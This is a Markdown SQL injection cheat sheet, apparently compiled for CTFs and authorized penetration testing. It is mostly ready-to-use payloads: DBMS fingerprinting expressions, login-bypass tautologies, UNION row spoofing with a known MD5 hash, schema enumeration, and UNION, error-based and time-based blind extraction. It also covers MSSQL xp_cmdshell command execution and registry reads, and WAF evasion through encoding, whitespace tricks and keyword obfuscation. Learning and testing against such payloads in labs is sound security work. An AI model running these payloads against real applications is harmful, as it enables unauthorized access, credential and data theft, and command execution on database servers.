# SQL Injection (SQLi) Reference Guide

A comprehensive quick-reference guide covering SQL injection methodologies, database identification, schema enumeration, extraction techniques, and filter evasion for security assessments and lab environments.

# SQL Injection (SQLi) — Quick Reference

**SQL Injection (SQLi)** is a vulnerability that occurs when untrusted user input is incorporated into a SQL query without proper validation or parameterization. From an attacker's perspective, SQLi can sometimes allow manipulation of database queries, authentication logic, data retrieval, or other database operations.

SQLi is commonly encountered in **CTFs, vulnerable applications, and authorized penetration tests**.

---

## What Is SQL Injection?

```text
                USER INPUT
                    │
                    ▼
             ┌─────────────┐
             │ Application │
             └──────┬──────┘
                    │
                    │ Unsafe query construction
                    ▼
             ┌─────────────┐
             │   Database  │
             └──────┬──────┘
                    │
                    ▼
              Query Result
```

Typical SQLi Attack Flow
```text
┌──────────────────────┐
│ 1. Find Input Point  │
│                      │
│ Parameter / Form /   │
│ Cookie / Header      │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 2. Test for SQLi     │
│                      │
│ Observe application  │
│ response / errors    │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 3. Identify DBMS     │
│                      │
│ MySQL / MSSQL /      │
│ PostgreSQL / etc.    │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 4. Enumerate         │
│                      │
│ Tables / Columns /   │
│ Database information │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 5. Extract / Validate│
│                      │
│ Retrieve relevant    │
│ data in the lab      │
└──────────────────────┘
```
---

## 1. DBMS Identification

### Keyword-Based Fingerprinting
Inject DBMS-specific built-in functions to observe boolean `TRUE` responses and identify the backend database engine.
```
| DBMS             | Verification Expression (Evaluates to True) |
| :---             | :--- |
| **MySQL**        | `conv('a',16,2)=conv('a',16,2)`<br>`connection_id()=connection_id()`<br>`crc32('MySQL')=crc32('MySQL')` |
| **MSSQL**        |  `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`<br>`@@CONNECTIONS>0`<br>`@@CONNECTIONS=@@CONNECTIONS`<br>`@@CPU_BUSY=@@CPU_BUSY`<br>`USER_ID(1)=USER_ID(1)` |
| **PostgreSQL**   | `5::int=5`<br>`5::integer=5`<br>`pg_client_encoding()=pg_client_encoding()`<br>`get_current_ts_config()=get_current_ts_config()`<br>`quote_literal(42.5)=quote_literal(42.5)`<br>`current_database()=current_database()` |
| **Oracle**       | `ROWNUM=ROWNUM`<br>`RAWTOHEX('AB')=RAWTOHEX('AB')`<br>`LNNVL(0=123)` |
| **SQLite**       | `sqlite_version()=sqlite_version()`<br>`last_insert_rowid()>1`<br>`last_insert_rowid()=last_insert_rowid()` |
| **MS Access**    | `val(cvar(1))=1`<br>`IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |
```
---

### Error-Based Fingerprinting
Induce deliberate database syntax or conversion errors to identify the engine from the returned error string.
```
| DBMS             | Trigger Payload     | Expected Error Output |
| :---             | :---                | :--- |
| **MySQL**        | `'`                 | `You have an error in your SQL syntax; ... near '' at line 1` |
| **PostgreSQL**   | `'`<br>`1'`         | `ERROR: unterminated quoted string at or near "'"`<br>`ERROR: syntax error at or near "1"` |
| **MSSQL**        | `'`<br>`1'`         | `Unclosed quotation mark after the character string ''.`<br>`Incorrect syntax near ''.`<br>`The conversion of the varchar value to data type int resulted in an out-of-range value.` |
| **Oracle**       | `'`<br>`1'`         | `ORA-00933: SQL command not properly ended`<br>`ORA-01756: quoted string not properly terminated`<br>`ORA-00923: FROM keyword not found where expected` |
```
---

## 2. Authentication Bypass

### Standard Tautology Payloads
Bypasses authentication when inputs are concatenated directly into SQL queries (e.g., `SELECT * FROM users WHERE username = '$user' AND password = '$password'`).

-- Most Common --
```sql
admin' OR '1'='1' - -  
```
-- Inline comment terminators
```sql
admin' -- -
admin' #
admin'/*
```
-- Standard boolean OR bypasses (Form fields & URL parameters)
```sql
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*
') OR 1=1-- -
') OR ('1'='1-- -
' OR '1'='1'-- -
" OR ""=""-- -
" OR 1=1-- -
```
-- Limiting results to prevent multi-row application errors
```sql
' OR 1=1 LIMIT 1 -- -
```


## 3. Hash-Check & Row Spoofing via UNION
Applications that retrieve a row and subsequently compare the hashed password in application code can be bypassed by spoofing the returned dataset using UNION
-- Spoof a record where the DB returns a known MD5 hash ('81dc9bdb52d04dc20036dbd8313ed055' = MD5('1234'))
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'-- -
```

## 4. Schema & Column Enumeration
Error-Based Discovery (GROUP BY / HAVING)
Incrementally extract column names on engines that expose detailed aggregate query errors

```sql
' HAVING 1=1 -- -                                       -- Returns: Column 'table.col1' is invalid in HAVING clause
' GROUP BY table.col1 HAVING 1=1 -- -                   -- Returns: Column 'table.col2' is invalid in HAVING clause
' GROUP BY table.col1, table.col2 HAVING 1=1 -- -       -- Returns next unaggregated column
```

Column Count & Data Type Detection
Determine column count via ORDER BY or UNION SELECT, and test column types via type conversions or aggregate functions.


-- Determining column count
```sql
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
```

-- Determining data types via error injection
```sql
' UNION SELECT sum(column_to_test) FROM users-- -       -- Fails on non-numeric types
1' UNION ALL SELECT 1, NULL, NULL WHERE 1=2-- -         -- Tests if Column 1 is an Integer
1' UNION ALL SELECT 1, 'text', NULL WHERE 1=2-- -       -- Tests if Column 2 accepts Strings
```

## 5. Extraction Techniques
UNION-Based Data Extraction
Extract records by joining attacker-controlled queries to the original result set.

-- MySQL / MariaDB
```sql
1' UNION SELECT 1, @@version, 3-- -
1' UNION SELECT 1, database(), 3-- -
1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()-- -
1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users'-- -
```

-- PostgreSQL
```sql
1' UNION SELECT NULL, version(), NULL-- -
1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables-- -
```

-- Oracle (Requires matching data types and explicit FROM clause)
```sql
1' UNION SELECT NULL, banner FROM v$version-- -
```

Error-Based Data Extraction
Force the database to evaluate an internal expression inside an error-generating function to return sensitive output in the error message.

-- PostgreSQL (Cast conversion error)
```sql
LIMIT CAST((SELECT version()) AS numeric)
```

-- MySQL (extractvalue / updatexml)
```sql
AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))
AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)
```

-- MSSQL (Conversion error)
```sql
AND 1=CONVERT(int, (SELECT @@version))
```

Blind Injection (Boolean-Based)
Infer data character-by-character by evaluating conditional true/false responses.

-- Length check
```sql
AND LENGTH((SELECT database())) = 4 -- -
```

-- Character extraction via substring and ASCII comparison
```sql
AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 97 -- -
AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 100 -- -
```

Blind Injection (Time-Based & Heavy Queries)
Used when no direct error or visible change occurs in application responses. Execution delay reflects query truth value.
```
Engine          Delay Technique                      Heavy Query Alternative
MySQL       => 	AND SLEEP(5)-- -	                => AND BENCHMARK(50000000, MD5(1))
PostgreSQL  =>	AND pg_sleep(5)-- -	              => AND (SELECT COUNT(*) FROM generate_series(1,5000000))
MSSQL	      => ; WAITFOR DELAY '00:00:05'-- -	    => —
SQLite	    =>	 -                                =>AND RANDOMBLOB(500000000/2)
```

-- Conditional Time-Based Extraction (MySQL)
```sql
AND IF(ASCII(SUBSTRING((SELECT @@version), 1, 1)) = 53, SLEEP(5), 0)-- -
```
-- Conditional Time-Based Extraction (MSSQL)
```sql
IF (ASCII(SUBSTRING((SELECT @@version), 1, 1)) = 53) WAITFOR DELAY '00:00:05'-- -
```

## 5. Advanced Injection Scenarios

Second-Order SQL Injection
Occurs when an injected payload is safely stored in the database first (without triggering immediate execution) and later executed unsafely when retrieved by a secondary backend process.

-- Step 1 (Storage): User registers with crafted input
```
Username: admin'--
Email: admin@lab.local
```
-- Database stores the value safely:
```sql
INSERT INTO users (username, email) VALUES ('admin\'--', 'admin@lab.local');
```
-- Step 2 (Execution): A secondary query dynamically concatenates the stored string:
```sql
SELECT * FROM activity_logs WHERE username = 'admin'--'
```

MSSQL Stored Procedures
Common administrative stored procedures encountered in MSSQL environments:

-- Command Execution via xp_cmdshell
```sql
EXEC master..xp_cmdshell 'whoami';
```
-- Registry Enumeration
```sql
EXEC xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares';
EXEC xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\valid';
```

## 6. Filters Evasion

A curated reference guide for bypassing Web Application Firewalls (WAFs), input sanitization routines, and character blacklists during security testing.

---

## 1. Character & Payload Encoding

When direct SQL characters are filtered, leverage standard, double, or alternative character encoding schemes:
```
| Encoding Type              | Character / String      | Encoded Representation |

| **URL Encoding**           | `'`                     | `%27` |
                             | `"`                     | `%22` |
                             | `#`                     | `%23` |
                             | `;`                     | `%3B` |
                             | `)`                     | `%29` |
                             | `*`                     | `%2A` |
                             | ` ` (Space)             | `%20` or `+` |

| **Double URL Encoding**    | `'`                     | `%2527` or `%%2727` |
                             | `"`                     | `%2522` |
                             | ` ` (Space)             | `%2520` |

| **Unicode Representation** | Single Quote Variations | `U+02BA` (`ʺ`), `U+02B9` (`ʹ`), `\u0027` |
| **Hex Encoding**           | `select @@version`      | `0x73656c65637420404076657273696f6e` |
```
---

## 2. Whitespace Bypasses

When standard space characters (`%20` or ` `) are blocked or stripped by filters:

### Alternative Whitespace Characters
Database engines interpret various non-standard ASCII control characters as whitespace:
```
| Target DBMS               | Supported Whitespace Characters (Hex) |
| **MySQL 5+**              | `%09` (Tab), `%0A` (Line Feed), `%0B` (Vertical Tab), `%0C` (Form Feed), `%0D` (Carriage Return), `%A0` (Non-breaking space) |
| **PostgreSQL**            | `%09`, `%0A`, `%0C`, `%0D` |
| **SQLite3**               | `%09`, `%0A`, `%0C`, `%0D` |
| **Oracle 11g+**           | `%00`, `%09`, `%0A`, `%0C`, `%0D` |
| **MSSQL**                 | `%01` through `%1F`, `%20` |
```
### Syntax Alternatives for Spaces


-- Inline Comments (MySQL, MSSQL, Oracle, PostgreSQL)
```sql
SELECT/**/password/**/FROM/**/users;
?id=1/*comment*/AND/**/1=1/**/-- -
```

-- MySQL Version-Specific Conditional Comments
```sql
?id=1/*!12345UNION*//*!12345SELECT*/1,2,3-- -
```
-- Parentheses Grouping
```sql
?id=(1)and(1)=(1)-- -
SELECT(password)FROM(users)WHERE(id=1);
```

When the comma (`,`) character is stripped, filtered, or prohibited in inputs:
```
| Function / Syntax         | Standard Form             | Comma-Free Alternative |
| **Pagination / LIMIT**    | `LIMIT 0,1`               | `LIMIT 1 OFFSET 0` |
| **Substring Extraction**  | `SUBSTR('SQL', 1, 1)`     | `SUBSTR('SQL' FROM 1 FOR 1)` |
| **Multi-Column UNION**    | `UNION SELECT 1, 2, 3, 4` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |
```
---

Equality & Operator Substitutions

When comparison and logical operators (`=`, `AND`, `OR`, `>`) or query clauses (`WHERE`) are blocked:
```
| Blocked Syntax   | Bypass Alternative     | Example |
| :---             | :---                   | :---    |
| `=`              | `LIKE`                 | `SUBSTRING(version(), 1, 1) LIKE 5` |
| `=`              | `IN (...)`             | `SUBSTRING(version(), 1, 1) IN (5)` |
| `=`              | `BETWEEN ... AND ...`  | `SUBSTRING(version(), 1, 1) BETWEEN 5 AND 5` |
| `=`              | `REGEXP` / `RLIKE`     | `user() REGEXP '^root'` |
| `AND`            | `&&`                   | `1' && 1=1-- -` |
| `OR`             | `\|\|`                 | `1' \|\| 1=1-- -` |
| `>`              | `NOT BETWEEN 0 AND X`  | `id NOT BETWEEN 0 AND 10` |
| `WHERE`          | `HAVING`               | `SELECT user, pass FROM users GROUP BY user, pass HAVING 1=1` |
```
---

Keyword Obfuscation & Splitting

When signature-based filters detect SQL keywords (`SELECT`, `UNION`, `ADMIN`):

### Mixed-Case Variations
```sql
uNiOn sElEcT 1,2,3-- -
SeLeCt * FrOm uSeRs;
```


<div align="center">

### Legal Disclaimer

**Maintained & Curated by 5kullk3r**

*This material is maintained and curated for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*

*Some content may have been collected or adapted from publicly available resources and/or third-party sources. No claim of original authorship or ownership is made over such material unless explicitly stated. Credit and attribution belong to the respective original authors or sources where applicable.*

<sub>Unauthorized system access is illegal. **5kullk3r** does not claim ownership of third-party content and disclaims all liability for any misuse or damages.</sub>

</div>
